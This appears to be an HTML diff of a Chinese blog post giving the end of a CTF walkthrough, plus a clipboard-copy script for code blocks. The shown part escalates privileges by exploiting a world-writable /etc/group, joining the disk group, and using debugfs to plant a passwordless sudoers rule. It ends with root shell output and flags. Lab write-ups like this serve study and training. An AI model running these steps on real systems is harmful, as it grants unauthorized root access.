+<pre class="notranslate"><code class="notranslate">5399e8634cc0be890edaf70a1c825c64  /etc/motd
 </code></pre>
 <p>等 inotifywait 触发：</p>
-<pre lang="bash"><code>sleep 2
-ls -la /etc/group
+<div class="highlight highlight-source-shell"><pre class="notranslate">sleep 2
+ls -la /etc/group</pre></div>
+<pre class="notranslate"><code class="notranslate">-rw-r--rw-    1 root     root           650 ...
 </code></pre>
-<pre><code>-rw-r--rw-    1 root     root           650 ...
-</code></pre>
-<p><code>/etc/group</code> 可写了。</p>
+<p><code class="notranslate">/etc/group</code> 可写了。</p>
 <h2>debugfs 写 sudoers 提权</h2>
-<p><code>/etc/group</code> 可写意味着可以把自己加入 disk 组。disk 组的用户可以直接用 debugfs 读写块设备，等于拥有了对文件系统的完全控制权。</p>
-<p>编辑 <code>/etc/group</code>，将 dog 加入 disk 组（注意 <code>/etc/group</code> 第四字段的用户列表使用逗号分隔）：</p>
-<pre><code>disk:x:6:root,dog
+<p><code class="notranslate">/etc/group</code> 可写意味着可以把自己加入 disk 组。disk 组的用户可以直接用 debugfs 读写块设备，等于拥有了对文件系统的完全控制权。</p>
+<p>编辑 <code class="notranslate">/etc/group</code>，将 dog 加入 disk 组（注意 <code class="notranslate">/etc/group</code> 第四字段的用户列表使用逗号分隔）：</p>
+<pre class="notranslate"><code class="notranslate">disk:x:6:root,dog
 </code></pre>
 <p>重新登录 dog 让附加组生效：</p>
-<pre lang="bash"><code>exit
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">exit</span>
 su - dog
-id
-</code></pre>
-<p>确认输出中包含 <code>6(disk)</code>。</p>
+id</pre></div>
+<p>确认输出中包含 <code class="notranslate">6(disk)</code>。</p>
 <p>确认根分区设备和文件系统类型：</p>
-<pre lang="bash"><code>mount | grep ' on / '
+<div class="highlight highlight-source-shell"><pre class="notranslate">mount <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">'</span> on / <span class="pl-pds">'</span></span></pre></div>
+<pre class="notranslate"><code class="notranslate">/dev/sda3 on / type ext4 (rw,relatime)
 </code></pre>
-<pre><code>/dev/sda3 on / type ext4 (rw,relatime)
-</code></pre>
-<p>用 debugfs 往 <code>/etc/sudoers.d/</code> 写入一条规则，给 dog 用户无密码 sudo 权限：</p>
-<pre lang="bash"><code>printf 'dog ALL=(ALL) NOPASSWD: ALL\n' &gt; /tmp/give_dog_sudo
+<p>用 debugfs 往 <code class="notranslate">/etc/sudoers.d/</code> 写入一条规则，给 dog 用户无密码 sudo 权限：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span>dog ALL=(ALL) NOPASSWD: ALL\n<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /tmp/give_dog_sudo
 
-/usr/sbin/debugfs -w /dev/sda3 &lt;&lt;'EOF'
-write /tmp/give_dog_sudo /etc/sudoers.d/give_dog_sudo
-sif /etc/sudoers.d/give_dog_sudo i_mode 0100440
-sif /etc/sudoers.d/give_dog_sudo i_uid 0
-sif /etc/sudoers.d/give_dog_sudo i_gid 0
-q
-EOF
-</code></pre>
-<p>debugfs 直接操作 ext 文件系统的 inode，写入文件并设置权限为 0440（<code>0100440</code> 中 <code>0100000</code> 表示普通文件，<code>0440</code> 为权限位）、owner 为 root:root，满足 sudoers 的安全检查要求。</p>
-<pre lang="bash"><code>sudo -l
+/usr/sbin/debugfs -w /dev/sda3 <span class="pl-s"><span class="pl-k">&lt;&lt;</span>'<span class="pl-k">EOF</span>'</span>
+<span class="pl-s">write /tmp/give_dog_sudo /etc/sudoers.d/give_dog_sudo</span>
+<span class="pl-s">sif /etc/sudoers.d/give_dog_sudo i_mode 0100440</span>
+<span class="pl-s">sif /etc/sudoers.d/give_dog_sudo i_uid 0</span>
+<span class="pl-s">sif /etc/sudoers.d/give_dog_sudo i_gid 0</span>
+<span class="pl-s">q</span>
+<span class="pl-s"><span class="pl-k">EOF</span></span></pre></div>
+<p>debugfs 直接操作 ext 文件系统的 inode，写入文件并设置权限为 0440（<code class="notranslate">0100440</code> 中 <code class="notranslate">0100000</code> 表示普通文件，<code class="notranslate">0440</code> 为权限位）、owner 为 root:root，满足 sudoers 的安全检查要求。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo -l
 sudo sh
-id
-</code></pre>
-<pre><code>uid=0(root) gid=0(root)
+id</pre></div>
+<pre class="notranslate"><code class="notranslate">uid=0(root) gid=0(root)
 </code></pre>
 <h1>Flag</h1>
-<pre lang="bash"><code>busybox cat /home/cat/user.txt
-busybox cat /root/root.txt
-</code></pre>
-<pre><code>flag{user-af6b54609f58d96c373f64179758201d}
+<div class="highlight highlight-source-shell"><pre class="notranslate">busybox cat /home/cat/user.txt
+busybox cat /root/root.txt</pre></div>
+<pre class="notranslate"><code class="notranslate">flag{user-af6b54609f58d96c373f64179758201d}
 flag{root-99dc32aab0563305b639550763a02e32}
-</code></pre>
-</div>
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -365,7 +347,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -412,7 +394,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
